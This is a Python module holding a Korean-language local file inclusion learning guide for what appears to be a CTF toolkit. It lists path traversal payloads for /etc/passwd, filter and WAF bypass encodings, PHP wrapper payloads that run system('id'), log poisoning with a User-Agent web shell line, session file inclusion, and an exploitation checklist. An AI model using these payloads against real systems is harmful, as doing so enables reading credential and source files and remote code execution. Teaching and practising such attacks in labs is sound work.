"""Local File Inclusion (LFI) Learning Guide."""

LFI_GUIDE = {
    "attack_type": "lfi",
    "title": "Local File Inclusion (LFI) Guide",
    "severity": "high",
    "difficulty": "intermediate",

    "overview": """LFI(Local File Inclusion)는 애플리케이션이 파일 경로를 동적으로 포함할 때 발생합니다.
경로 조작(Path Traversal)을 통해 의도하지 않은 파일을 읽거나 실행할 수 있습니다.

PHP의 include(), require() 또는 다른 언어의 파일 읽기 기능에서 주로 발견됩니다.
LFI는 단순 파일 읽기부터 원격 코드 실행(RCE)까지 발전할 수 있어 위험합니다.""",

    "impact": [
        "소스 코드 및 설정 파일 노출",
        "민감 정보 탈취 (비밀번호, API 키)",
        "원격 코드 실행 (Log Poisoning, PHP Wrappers)",
        "세션 하이재킹 (세션 파일 읽기)",
    ],

    "vulnerable_patterns": [
        "include($_GET['page']);",
        "file_get_contents($user_input);",
        "readfile('../' . $filename);",
    ],

    "techniques": {
        "basic": {
            "name": "Basic Path Traversal",
            "difficulty": "beginner",
            "how_it_works": """기본 경로 조작은 ../를 사용하여 상위 디렉토리로 이동합니다.
충분한 ../를 사용하면 파일 시스템 루트까지 이동하여 모든 파일에 접근 가능합니다.""",
            "prerequisites": [
                "파일 경로가 사용자 입력에 의해 결정됨",
                "경로 검증이 불충분함",
            ],
            "payloads": [
                {"payload": "../../../etc/passwd", "purpose": "Linux passwd 파일", "expected": "root:x:0:0:..."},
                {"payload": "....//....//....//etc/passwd", "purpose": "../ 필터 우회", "expected": "root:x:0:0:..."},
                {"payload": "..%2f..%2f..%2fetc/passwd", "purpose": "URL 인코딩", "expected": "root:x:0:0:..."},
                {"payload": "..%252f..%252f..%252fetc/passwd", "purpose": "더블 URL 인코딩", "expected": "root:x:0:0:..."},
                {"payload": "/etc/passwd", "purpose": "절대 경로", "expected": "root:x:0:0:..."},
            ],
            "detection_patterns": [
                "파일 내용이 응답에 포함됨",
                "root:x:0:0 패턴",
                "에러 메시지에 파일 경로 노출",
            ],
            "common_mistakes": [
                "../ 개수가 부족함 - 충분히 많이 사용",
                "Windows는 ..\\ 사용",
            ],
        },

        "null_byte": {
            "name": "Null Byte Injection",
            "difficulty": "intermediate",
            "how_it_works": """구버전 PHP(< 5.3.4)에서는 Null 바이트(%00)로 문자열을 종료시킬 수 있습니다.
확장자가 강제 추가되는 경우 이를 우회할 수 있습니다.""",
            "prerequisites": [
                "PHP < 5.3.4",
                "확장자가 강제 추가됨 (예: .php)",
            ],
            "payloads": [
                {"payload": "../../../etc/passwd%00", "purpose": "Null byte로 확장자 무시", "expected": "passwd 내용"},
                {"payload": "../../../etc/passwd%00.php", "purpose": ".php 확장자 우회", "expected": "passwd 내용"},
            ],
            "detection_patterns": [
                "확장자가 붙어도 원하는 파일 읽힘",
            ],
            "common_mistakes": [
                "최신 PHP에서는 동작하지 않음",
            ],
        },

        "php_wrappers": {
            "name": "PHP Wrappers",
            "difficulty": "intermediate",
            "how_it_works": """PHP는 다양한 스트림 래퍼를 지원합니다.
php://filter로 소스 코드를 base64 인코딩하여 읽거나, php://input으로 코드 실행이 가능합니다.""",
            "prerequisites": [
                "PHP 환경",
                "allow_url_include 또는 allow_url_fopen 활성화",
            ],
            "payloads": [
                {"payload": "php://filter/convert.base64-encode/resource=index.php", "purpose": "소스코드 base64 읽기", "expected": "base64 인코딩된 소스"},
                {"payload": "php://filter/read=string.rot13/resource=index.php", "purpose": "ROT13 인코딩 읽기", "expected": "rot13 인코딩된 소스"},
                {"payload": "php://input", "purpose": "POST 바디 실행 (allow_url_include)", "expected": "POST 데이터 실행"},
                {"payload": "data://text/plain,<?php system('id');?>", "purpose": "data 래퍼로 코드 실행", "expected": "uid=xxx 출력"},
                {"payload": "data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+", "purpose": "base64 data 래퍼", "expected": "uid=xxx 출력"},
            ],
            "detection_patterns": [
                "base64 인코딩된 데이터 반환",
                "PHP 코드 실행 결과",
            ],
            "common_mistakes": [
                "allow_url_include=Off면 php://input, data:// 불가",
                "base64 디코딩 필요",
            ],
        },

        "log_poisoning": {
            "name": "Log Poisoning",
            "difficulty": "advanced",
            "how_it_works": """로그 파일에 PHP 코드를 삽입한 후, LFI로 해당 로그를 포함시켜 코드를 실행합니다.
User-Agent, Referer 헤더 또는 SSH 로그 등에 코드를 삽입합니다.""",
            "prerequisites": [
                "로그 파일 위치 알려짐",
                "로그 파일 읽기 권한",
                "PHP 코드 삽입 가능한 헤더 존재",
            ],
            "payloads": [
                {"payload": "User-Agent: <?php system($_GET['cmd']); ?>", "purpose": "UA에 코드 삽입", "expected": "access.log에 PHP 코드 기록"},
                {"payload": "../../../var/log/apache2/access.log", "purpose": "Apache 로그 포함", "expected": "로그 + 코드 실행"},
                {"payload": "../../../var/log/nginx/access.log", "purpose": "Nginx 로그 포함", "expected": "로그 + 코드 실행"},
                {"payload": "../../../var/log/auth.log", "purpose": "SSH 로그 포함", "expected": "로그 내용"},
                {"payload": "../../../proc/self/environ", "purpose": "환경 변수 (UA 포함)", "expected": "환경 변수 + 코드 실행"},
            ],
            "detection_patterns": [
                "로그 내용이 출력됨",
                "삽입한 PHP 코드가 실행됨",
            ],
            "common_mistakes": [
                "로그 경로가 다를 수 있음 - 여러 경로 시도",
                "로그 포맷에 따라 삽입 위치 다름",
            ],
        },

        "session_inclusion": {
            "name": "Session File Inclusion",
            "difficulty": "advanced",
            "how_it_works": """PHP 세션 파일에 코드를 삽입한 후 해당 파일을 포함시킵니다.
세션에 저장되는 사용자 입력에 PHP 코드를 삽입합니다.""",
            "prerequisites": [
                "세션 파일 위치 알려짐 (보통 /tmp/sess_SESSIONID)",
                "사용자 입력이 세션에 저장됨",
            ],
            "payloads": [
                {"payload": "<?php system('id'); ?>", "purpose": "세션 변수에 코드 삽입", "expected": "세션에 PHP 코드 저장"},
                {"payload": "../../../tmp/sess_[SESSION_ID]", "purpose": "세션 파일 포함", "expected": "코드 실행"},
            ],
            "detection_patterns": [
                "세션 데이터 출력",
                "삽입 코드 실행",
            ],
            "common_mistakes": [
                "세션 ID 필요 - 쿠키에서 확인",
                "세션 저장 경로가 다를 수 있음",
            ],
        },
    },

    "checklist": [
        {
            "step": 1,
            "action": "파일 포함 기능 식별",
            "expected_result": "page=, file=, template= 등 파라미터 파악",
            "command_example": "ctf-toolkit recon --url http://target.com",
            "notes": "언어 선택, 템플릿 로드 기능 확인"
        },
        {
            "step": 2,
            "action": "기본 경로 조작 테스트",
            "expected_result": "../로 상위 디렉토리 접근 확인",
            "command_example": "ctf-toolkit lfi scan -u 'http://target.com?page='",
            "notes": "../ 반복하여 /etc/passwd 시도"
        },
        {
            "step": 3,
            "action": "필터 우회 시도",
            "expected_result": "인코딩, 더블 슬래시 등으로 우회",
            "command_example": None,
            "notes": "..%2f, ....//....// 등"
        },
        {
            "step": 4,
            "action": "Null 바이트 테스트",
            "expected_result": "확장자 강제 추가 우회",
            "command_example": None,
            "notes": "구버전 PHP에서만 동작"
        },
        {
            "step": 5,
            "action": "PHP 래퍼 테스트",
            "expected_result": "소스 코드 읽기 또는 RCE",
            "command_example": None,
            "notes": "php://filter, data://, php://input"
        },
        {
            "step": 6,
            "action": "로그 파일 위치 확인",
            "expected_result": "접근 가능한 로그 파일 경로",
            "command_example": None,
            "notes": "/var/log/apache2/, /var/log/nginx/"
        },
        {
            "step": 7,
            "action": "Log Poisoning 시도",
            "expected_result": "로그를 통한 RCE",
            "command_example": None,
            "notes": "UA에 PHP 코드 삽입 후 로그 포함"
        },
        {
            "step": 8,
            "action": "민감 파일 추출",
            "expected_result": "설정 파일, 소스 코드 획득",
            "command_example": None,
            "notes": "config.php, .env, database.yml 등"
        },
    ],

    "detection_patterns": [
        {
            "pattern_type": "behavior",
            "indicator": "root:x:0:0 (passwd 내용)",
            "confidence": "high",
            "db_specific": None,
            "example_response": "root:x:0:0:root:/root:/bin/bash"
        },
        {
            "pattern_type": "behavior",
            "indicator": "[fonts] (win.ini)",
            "confidence": "high",
            "db_specific": None,
            "example_response": "; for 16-bit app support\\n[fonts]"
        },
        {
            "pattern_type": "behavior",
            "indicator": "base64 인코딩된 PHP 소스",
            "confidence": "high",
            "db_specific": None,
            "example_response": "PD9waHAKLy8gY29uZmln..."
        },
        {
            "pattern_type": "error_message",
            "indicator": "failed to open stream",
            "confidence": "medium",
            "db_specific": None,
            "example_response": "Warning: include(): Failed to open stream"
        },
        {
            "pattern_type": "error_message",
            "indicator": "No such file or directory",
            "confidence": "medium",
            "db_specific": None,
            "example_response": "Warning: include(../../../etc/shadow): No such file"
        },
    ],

    "waf_bypass": [
        {
            "technique": "더블 슬래시",
            "example": "....//....//etc/passwd",
            "effective_against": "../ 단순 제거 필터"
        },
        {
            "technique": "URL 인코딩",
            "example": "..%2f..%2f",
            "effective_against": "Plain text 필터"
        },
        {
            "technique": "더블 URL 인코딩",
            "example": "..%252f",
            "effective_against": "Single decode 필터"
        },
        {
            "technique": "UTF-8 오버롱",
            "example": "..%c0%af",
            "effective_against": "Basic pattern matching"
        },
        {
            "technique": "Null 바이트",
            "example": "..%00",
            "effective_against": "확장자 강제 추가"
        },
        {
            "technique": "경로 정규화",
            "example": "/etc/passwd/../passwd",
            "effective_against": "Simple path validation"
        },
    ],

    "ctf_tips": [
        "../../../etc/passwd로 빠르게 LFI 확인",
        "php://filter/convert.base64-encode/resource=로 소스 코드 읽기",
        "base64 디코딩: echo 'BASE64' | base64 -d",
        "Log Poisoning: UA에 <?php system($_GET['c']); ?> 삽입",
        "세션 파일: /tmp/sess_[PHPSESSID]",
        "/proc/self/environ으로 환경 변수 읽기 (UA 포함)",
        "allow_url_include=On이면 php://input + POST로 RCE",
        "wrapper 목록: php://, data://, file://, expect://, phar://",
        "Windows: C:\\Windows\\win.ini, C:\\inetpub\\logs\\",
    ],
}
